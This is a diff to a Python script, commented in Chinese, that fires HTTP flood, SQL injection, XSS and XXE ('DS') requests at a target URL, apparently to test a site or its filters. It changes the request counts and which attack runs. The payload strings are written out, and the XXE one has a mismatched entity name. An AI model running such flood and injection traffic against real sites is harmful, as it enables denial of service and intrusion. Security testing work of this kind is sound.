@@ -5,9 +5,9 @@ import time
 
 TARGET_URL = "http://testing.com/"   # 目標網址
 FLOOD_COUNT = 510                    # Flood 請求次數
-SQLI_COUNT = 100                     # SQLi 請求次數
+SQLI_COUNT = 30                     # SQLi 請求次數
 XSS_COUNT = 35                       # XSS 請求次數
-DS_COUNT = 30                        # DS 請求次數
+DS_COUNT = 15                        # DS 請求次數
 THREADS = 10                         # 多執行緒數量（Flood用）
 
 
@@ -63,15 +63,15 @@ def ds_attack(url, count):
 if __name__ == "__main__":
     #print("\n==== HTTP Flood 測試 ====")
     #http_flood_attack(TARGET_URL, FLOOD_COUNT, THREADS)
-    print("==== SQL Injection 測試 ====")
-    sqli_url = TARGET_URL + "?id=1'+OR+'1'='1"
-    sql_injection(sqli_url, SQLI_COUNT)
-    print("SQL Injection 測試完成！\n")
+    #print("==== SQL Injection 測試 ====")
+    #sqli_url = TARGET_URL + "?id=1'+OR+'1'='1"
+    #sql_injection(sqli_url, SQLI_COUNT)
+    #print("SQL Injection 測試完成！\n")
 
-    #print("==== XSS 測試 ====")
-    #xss_url = TARGET_URL + "<;IMG SRC=\";mocha:[code]\";>;"
-    #xss_attack(xss_url, XSS_COUNT)
-    #print("XSS 測試完成！\n")
+    print("==== XSS 測試 ====")
+    xss_url = TARGET_URL + "<;IMG SRC=\";mocha:[code]\";>;"
+    xss_attack(xss_url, XSS_COUNT)
+    print("XSS 測試完成！\n")
 
     #print("==== DS Attack 測試 ====")
     #ds_url = TARGET_URL + "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xee;</foo>"
